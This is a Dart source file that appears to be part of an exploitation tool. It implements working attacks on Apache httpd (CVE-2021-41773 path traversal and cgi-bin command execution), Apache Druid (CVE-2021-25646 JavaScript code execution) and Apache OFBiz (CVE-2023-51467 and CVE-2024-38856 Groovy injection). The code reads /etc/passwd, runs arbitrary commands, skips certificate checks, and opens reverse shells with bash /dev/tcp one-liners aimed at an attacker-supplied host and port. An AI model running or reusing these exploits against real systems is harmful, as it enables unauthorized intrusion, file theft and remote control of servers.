import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';

import 'exp_result.dart';
import 'rce_encoder.dart';

class ApacheHttpdExpService {
  final String baseUrl;
  final Duration timeout;

  ApacheHttpdExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<String?> _sendRawHttp({
    required String method,
    required String rawPath,
    String? body,
    Map<String, String>? headers,
  }) async {
    final base = Uri.parse(_base);
    final host = base.host;
    if (host.isEmpty) return null;
    final isHttps = base.scheme == 'https';
    final port = base.hasPort ? base.port : (isHttps ? 443 : 80);
    final payload = body ?? '';
    final reqHeaders = <String, String>{
      'Host': base.hasPort ? '$host:$port' : host,
      'Connection': 'close',
      ...?headers,
    };
    if (payload.isNotEmpty) {
      reqHeaders['Content-Length'] = utf8.encode(payload).length.toString();
    }
    final headerText = reqHeaders.entries
        .map((e) => '${e.key}: ${e.value}')
        .join('\r\n');
    final request = StringBuffer()
      ..write('$method $rawPath HTTP/1.1\r\n')
      ..write('$headerText\r\n\r\n')
      ..write(payload);

    Socket? socket;
    try {
      socket = isHttps
          ? await SecureSocket.connect(host, port,
              timeout: timeout, onBadCertificate: (_) => true)
          : await Socket.connect(host, port, timeout: timeout);
      socket.write(request.toString());
      await socket.flush();

      final bytes = await socket
          .cast<List<int>>()
          .timeout(timeout)
          .expand((chunk) => chunk)
          .toList();
      final text = utf8.decode(bytes, allowMalformed: true);
      final idx = text.indexOf('\r\n\r\n');
      return idx >= 0 ? text.substring(idx + 4) : text;
    } catch (_) {
      return null;
    } finally {
      try {
        await socket?.close();
      } catch (_) {}
    }
  }

  Future<ExpResult> check() async {
    try {
      final candidates = [
        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd',
      ];
      for (final rawPath in candidates) {
        final body = await _sendRawHttp(method: 'GET', rawPath: rawPath);
        if ((body ?? '').contains('root:') ||
            (body ?? '').contains('/bin/sh') ||
            (body ?? '').contains('/bin/bash')) {
          return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
        }
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-41773', '');
  }

  Future<String?> readFile(String filePath) async {
    try {
      final normalizedPath = filePath.startsWith('/') ? filePath : '/$filePath';
      final candidates = [
        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e$normalizedPath',
        '/icons/.%2e/%2e%2e/%2e%2e$normalizedPath',
      ];
      for (final rawPath in candidates) {
        final body = await _sendRawHttp(method: 'GET', rawPath: rawPath);
        if (body != null && body.isNotEmpty) return body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(String cmd) async {
    try {
      final candidates = [
        '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        '/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh',
      ];
      for (final rawPath in candidates) {
        final body = await _sendRawHttp(
          method: 'POST',
          rawPath: rawPath,
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'echo;$cmd',
        );
        if (body != null && body.trim().isNotEmpty) return body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<bool> getShell({
    required String lhost,
    required int lport,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = 'bash -i >& /dev/tcp/$host/$lport 0>&1';
    final out = await execRce(cmd);
    // Reverse shell usually has no useful HTTP body; success is request accepted.
    return out != null;
  }

  Future<bool> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = preferScript
        ? "bash -c 'export TERM=xterm-256color; "
            "if command -v script >/dev/null 2>&1; then "
            "script -q /dev/null bash >& /dev/tcp/$host/$lport 0>&1; "
            "elif command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &"
        : "bash -c 'export TERM=xterm-256color; "
            "if command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &";
    final out = await execRce(cmd);
    return out != null;
  }
}

class DruidExpService {
  final String baseUrl;
  final Duration timeout;

  DruidExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _buildPayload(String cmd) {
    final safeCmd = RceEncoder.escapeDoubleQuoted(cmd);
    final jsFunction =
        'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","$safeCmd"]).getInputStream()).useDelimiter("\\\\A").next();return {timestamp:123123,test: a}}';
    return jsonEncode({
      'type': 'index',
      'spec': {
        'ioConfig': {
          'type': 'index',
          'firehose': {'type': 'local', 'baseDir': '/etc', 'filter': 'passwd'},
        },
        'dataSchema': {
          'dataSource': 'test',
          'parser': {
            'parseSpec': {
              'format': 'javascript',
              'timestampSpec': {},
              'dimensionsSpec': {},
              'function': jsFunction,
              '': {'enabled': 'true'},
            },
          },
        },
      },
      'samplerConfig': {'numRows': 10},
    });
  }

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/druid/indexer/v1/sampler'),
            headers: {'Content-Type': 'application/json'},
            body: _buildPayload('id'),
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body);
        final data = decoded['data']?.toString() ?? '';
        if (data.isNotEmpty) {
          return ExpResult(
            true,
            'CVE-2021-25646',
            'Druid JavaScript 引擎可执行命令，输出:\n$data',
          );
        }
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-25646', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/druid/indexer/v1/sampler'),
            headers: {'Content-Type': 'application/json'},
            body: _buildPayload(cmd),
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body);
        final rows = decoded['data'] as List?;
        if (rows != null && rows.isNotEmpty) {
          final first = rows.first as Map?;
          final parsed = first?['parsed'] as Map?;
          final input = first?['input'] as Map?;
          return parsed?['test']?.toString() ??
              input?['test']?.toString() ??
              res.body;
        }
        return res.body;
      }
    } catch (_) {}
    return null;
  }

  Future<bool> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = preferScript
        ? "bash -c 'export TERM=xterm-256color; "
            "if command -v script >/dev/null 2>&1; then "
            "script -q /dev/null bash >& /dev/tcp/$host/$lport 0>&1; "
            "elif command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &"
        : "bash -c 'export TERM=xterm-256color; "
            "if command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &";
    final out = await execRce(cmd);
    return out != null;
  }
}

class OFBizExpService {
  final String baseUrl;
  final Duration timeout;

  OFBizExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  http.Client _client() {
    final ioClient = HttpClient()
      ..badCertificateCallback =
          ((X509Certificate cert, String host, int port) => true);
    return IOClient(ioClient);
  }

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  static const List<String> _programExportPaths = [
    '/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
    '/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y',
    '/webtools/control/main/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
    '/webtools/control/main/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y',
  ];

  List<String> _candidateBases() {
    final out = <String>[];
    void add(String b) {
      if (!out.contains(b)) out.add(b);
    }

    add(_base);
    try {
      final uri = Uri.parse(_base);
      if (uri.host.isEmpty) return out;
      final host = uri.host;
      final hasPort = uri.hasPort;
      final port = hasPort ? uri.port : null;

      // Vulhub OFBiz commonly exposes the web UI on HTTPS 8443.
      if (uri.scheme == 'http') {
        add(Uri(scheme: 'https', host: host, port: port ?? 443).toString());
      }
      add(Uri(scheme: 'https', host: host, port: 8443).toString());
    } catch (_) {}
    return out;
  }

  Future<ExpResult> checkCve202351467() async {
    final client = _client();
    try {
      final marker = 'MATRIX_${DateTime.now().millisecondsSinceEpoch}';
      final payload = "throw new Exception('echo $marker'.execute().text);";
          
      for (final base in _candidateBases()) {
        for (final path in _programExportPaths) {
          try {
            final res = await client
                .post(
                  Uri.parse('$base$path'),
                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                  body: 'groovyProgram=${Uri.encodeComponent(payload)}',
                )
                .timeout(timeout);
            final body = res.body;
            if (body.contains(marker) ||
                body.contains('java.lang.Exception') ||
                body.contains('groovy.lang') ||
                (body.contains('content-messages') &&
                    body.contains('Not executed for security reason'))) {
              return ExpResult(
                true,
                'CVE-2023-51467',
                'ProgramExport Groovy 注入可达，基址 $base，状态 ${res.statusCode}',
              );
            }
          } catch (_) {}
        }
      }
    } catch (_) {
    } finally {
      client.close();
    }
    return const ExpResult(false, 'CVE-2023-51467', '');
  }

  Future<ExpResult> checkCve202438856() async {
    final client = _client();
    try {
      const body =
          '------WebKitFormBoundaryMAtrix911\r\nContent-Disposition: form-data; name="groovyProgram"\r\n\r\nthrow new Exception("OFBiz_CVE_2024".class.nam\u0065);\r\n------WebKitFormBoundaryMAtrix911--';
      final res = await client
          .post(
            Uri.parse('$_base/webtools/control/main/ProgramExport'),
            headers: {
              'Content-Type':
                  'multipart/form-data; boundary=----WebKitFormBoundaryMAtrix911',
            },
            body: body,
          )
          .timeout(timeout);
      if (res.statusCode == 200 ||
          res.body.contains('java.lang') ||
          res.body.contains('content-messages')) {
        return ExpResult(
          true,
          'CVE-2024-38856',
          'OFBiz Groovy Unicode 绕过端点响应，状态 ${res.statusCode}',
        );
      }
    } catch (_) {
    } finally {
      client.close();
    }
    return const ExpResult(false, 'CVE-2024-38856', '');
  }

  Future<String?> execRce(String cmd) async {
    final client = _client();
    try {
      final cmdBytes = RceEncoder.groovyByteArray(cmd);
      final payload =
          "throw new Exception(['sh','-c',new String([$cmdBytes] as byte[])"
          "+' 2>&1'].\\u0065xecute().text);";

      for (final base in _candidateBases()) {
        for (final path in _programExportPaths) {
          try {
            final res = await client
                .post(
                  Uri.parse('$base$path'),
                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                  body: 'groovyProgram=${Uri.encodeComponent(payload)}',
                )
                .timeout(timeout);

            // OFBiz renders the exception message in various HTML elements.
            // Match everything after "java.lang.Exception:" until the next tag.
            final match = RegExp(
              r'java\.lang\.Exception:\s*([^<]+)',
              caseSensitive: false,
            ).firstMatch(res.body);

            String? out = match?.group(1)?.trim();
            if (out != null) {
              out = out
                  .replaceAll('&#xd;', '\r')
                  .replaceAll('&#xa;', '\n')
                  .replaceAll('&lt;', '<')
                  .replaceAll('&gt;', '>')
                  .replaceAll('&amp;', '&')
                  .replaceAll('&#39;', "'")
                  .trim();
              if (out.isEmpty || out.contains('<!DOCTYPE html>')) out = null;
            }

            if (out != null && out.isNotEmpty) {
              return out;
            }
          } catch (_) {}
        }
      }
      return null;
    } catch (_) {
      return null;
    } finally {
      client.close();
    }
  }

  /// CVE-2024-38856: multipart POST to /main/ProgramExport with Unicode bypass.
  Future<String?> execRce38856(String cmd) async {
    final client = _client();
    try {
      final cmdBytes = RceEncoder.groovyByteArray(cmd);
      final groovyCode =
          "throw new Exception(['sh','-c',new String([$cmdBytes] as byte[])"
          "+' 2>&1'].\\u0065xecute().text);";
      const boundary = '----WebKitFormBoundaryMAtrix911';
      final body = '--$boundary\r\n'
          'Content-Disposition: form-data; name="groovyProgram"\r\n\r\n'
          '$groovyCode\r\n'
          '--$boundary--';

      final res = await client
          .post(
            Uri.parse('$_base/webtools/control/main/ProgramExport'),
            headers: {
              'Content-Type':
                  'multipart/form-data; boundary=$boundary',
            },
            body: body,
          )
          .timeout(timeout);

      final match = RegExp(
        r'java\.lang\.Exception:\s*([^<]+)',
        caseSensitive: false,
      ).firstMatch(res.body);

      String? out = match?.group(1)?.trim();
      if (out != null) {
        out = out
            .replaceAll('&#xd;', '\r')
            .replaceAll('&#xa;', '\n')
            .replaceAll('&lt;', '<')
            .replaceAll('&gt;', '>')
            .replaceAll('&amp;', '&')
            .replaceAll('&#39;', "'")
            .trim();
        if (out.isEmpty || out.contains('<!DOCTYPE html>')) out = null;
      }
      return out?.isNotEmpty == true ? out : null;
    } catch (_) {
      return null;
    } finally {
      client.close();
    }
  }
}
